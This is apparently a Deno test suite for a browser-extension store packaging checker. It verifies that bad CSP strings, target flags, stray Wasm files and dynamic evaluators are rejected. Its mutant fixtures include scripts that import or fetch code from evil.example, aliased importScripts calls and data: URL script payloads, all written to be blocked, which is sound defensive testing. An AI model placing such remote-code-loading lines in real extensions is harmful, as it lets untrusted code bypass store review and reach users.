// @ts-nocheck: temporary package inventories intentionally model hostile files.
import { assertEquals, assertRejects, assertThrows } from "jsr:@std/assert@1";
import {
  assertStoreTargetBoundary,
  parsePackageArguments,
  STORE_EXTENSION_CSP,
  STORE_TARGET,
  STORE_WASM_LANE,
} from "../scripts/store-target-policy.mjs";

async function write(root, relative, value) {
  const file = `${root}/${relative}`;
  await Deno.mkdir(file.slice(0, file.lastIndexOf("/")), { recursive: true });
  if (value instanceof Uint8Array) await Deno.writeFile(file, value);
  else await Deno.writeTextFile(file, value);
  return {
    archivePath: relative,
    sourcePath: file,
  };
}

async function fixture({ manifestPatch, js, html, wasm } = {}) {
  const root = await Deno.makeTempDir({ prefix: "cap-store-policy-" });
  const manifest = {
    manifest_version: 3,
    name: "fixture",
    version: "1.0.0",
    content_security_policy: {
      extension_pages: STORE_EXTENSION_CSP,
    },
    ...(manifestPatch ?? {}),
  };
  const inventory = [
    await write(root, "manifest.json", `${JSON.stringify(manifest)}\n`),
    await write(root, "background.js", js ?? "export const clean = true;\n"),
    await write(
      root,
      "page.html",
      html ?? '<script type="module" src="background.js"></script>\n',
    ),
  ];
  if (wasm) {
    inventory.push(
      await write(root, "tools/host.wasm", new Uint8Array([0, 97, 115, 109])),
    );
  }
  return { root, inventory };
}

Deno.test("store target: exact CSP and bundled-only zero-binary lane pass without authority changes", async () => {
  const { root, inventory } = await fixture();
  try {
    const result = await assertStoreTargetBoundary({
      target: STORE_TARGET,
      inventory,
    });
    assertEquals(result.target, "store");
    assertEquals(result.csp, STORE_EXTENSION_CSP);
    assertEquals(result.wasmLane, STORE_WASM_LANE);
    assertEquals(result.canLoadOwnerPackages, false);
    assertEquals(result.canLoadNetworkPackages, false);
    assertEquals(result.allowedWorkerLiterals, []);
    assertEquals(result.wasmScanned, 0);
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("store target: explicit flag grammar rejects missing, alternate, duplicate and split targets", async () => {
  assertEquals(parsePackageArguments(["--target=store"]), {
    target: "store",
    validateOnly: false,
    archivePath: null,
  });
  assertEquals(
    parsePackageArguments(["--validate-only", "--target=store", "out.zip"]),
    { target: "store", validateOnly: true, archivePath: "out.zip" },
  );
  assertThrows(
    () => parsePackageArguments([]),
    Error,
    "explicit --target=store required",
  );
  assertThrows(
    () => parsePackageArguments(["--target=webstore"]),
    Error,
    "unsupported target",
  );
  assertThrows(
    () => parsePackageArguments(["--target=developer"]),
    Error,
    "target_developer_not_enabled",
  );
  assertThrows(
    () => parsePackageArguments(["--target=enterprise"]),
    Error,
    "target_enterprise_not_enabled",
  );
  assertThrows(
    () => parsePackageArguments(["--target=store", "--target=store"]),
    Error,
    "duplicate target",
  );
  assertThrows(
    () => parsePackageArguments(["--target", "store"]),
    Error,
    "unknown flag",
  );
  assertThrows(
    () => parsePackageArguments(["--validate-only"]),
    Error,
    "requires exactly one",
  );
  const { root, inventory } = await fixture();
  try {
    await assertRejects(
      () => assertStoreTargetBoundary({ target: null, inventory }),
      Error,
      "explicit --target=store required",
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("store target: CSP variants and extra policy keys fail exact equality", async () => {
  const variants = [
    {
      content_security_policy: {
        extension_pages: `${STORE_EXTENSION_CSP} wasm-unsafe-eval`,
      },
    },
    {
      content_security_policy: {
        extension_pages:
          "object-src 'self'; script-src 'self'; frame-src 'self' about: blob: data:",
      },
    },
    {
      content_security_policy: {
        extension_pages: STORE_EXTENSION_CSP,
        sandbox: "sandbox allow-scripts",
      },
    },
  ];
  for (const manifestPatch of variants) {
    const { root, inventory } = await fixture({ manifestPatch });
    try {
      await assertRejects(
        () => assertStoreTargetBoundary({ target: STORE_TARGET, inventory }),
        Error,
      );
    } finally {
      await Deno.remove(root, { recursive: true });
    }
  }
});

Deno.test("store target: remote script URL and alternate Worker mutants fail", async () => {
  for (
    const mutation of [
      { js: 'import "https://evil.example/remote.js";\n' },
      { js: 'await import("data:text/javascript,export default 1");\n' },
      { js: 'new Worker("alternate-worker.js");\n' },
      { js: "new Worker(runtimeSelectedUrl);\n" },
      { js: 'new globalThis["Worker"]("alternate-worker.js");\n' },
      { js: 'const W = globalThis.Worker; new W("alternate-worker.js");\n' },
      { js: 'const SW = SharedWorker; new SW("alternate-worker.js");\n' },
      { js: 'const load = self["importScripts"]; load("https://evil.example/a.js");\n' },
      { js: 'const get = globalThis.fetch; get("https://evil.example/a.mjs");\n' },
      {
        html:
          '<script type="module" src="https://evil.example/remote.js"></script>\n',
      },
      { html: '<script src="data:text/javascript,alert(1)"></script>\n' },
    ]
  ) {
    const { root, inventory } = await fixture(mutation);
    try {
      await assertRejects(
        () => assertStoreTargetBoundary({ target: STORE_TARGET, inventory }),
        Error,
        "static boundary violations",
      );
    } finally {
      await Deno.remove(root, { recursive: true });
    }
  }
});

Deno.test("store target: only the exact manifest sandbox evaluator path is exempt", async () => {
  const allowed = await fixture();
  try {
    allowed.inventory.push(
      await write(
        allowed.root,
        "sandbox/script-sandbox.js",
        'const run = new Function("return 1"); export { run };\n',
      ),
    );
    await assertStoreTargetBoundary({
      target: STORE_TARGET,
      inventory: allowed.inventory,
    });
  } finally {
    await Deno.remove(allowed.root, { recursive: true });
  }

  const denied = await fixture({
    js: 'const run = new Function("return 1"); export { run };\n',
  });
  try {
    await assertRejects(
      () => assertStoreTargetBoundary({
        target: STORE_TARGET,
        inventory: denied.inventory,
      }),
      Error,
      "dynamic source evaluator is forbidden",
    );
  } finally {
    await Deno.remove(denied.root, { recursive: true });
  }
});

Deno.test("store target: unmanifested or inventory-free Wasm authority fails the bundled-only lane", async () => {
  const { root, inventory } = await fixture({ wasm: true });
  try {
    await assertRejects(
      () => assertStoreTargetBoundary({ target: STORE_TARGET, inventory }),
      Error,
      "unmanifested_binary",
    );
  } finally {
    await Deno.remove(root, { recursive: true });
  }

  const clean = await fixture();
  try {
    await assertRejects(
      () =>
        assertStoreTargetBoundary({
          target: STORE_TARGET,
          inventory: clean.inventory,
          bundledWasmManifestByArchivePath: new Map([
            ["tools/missing.wasm", Object.freeze({})],
          ]),
        }),
      Error,
      "has no package byte",
    );
  } finally {
    await Deno.remove(clean.root, { recursive: true });
  }
});
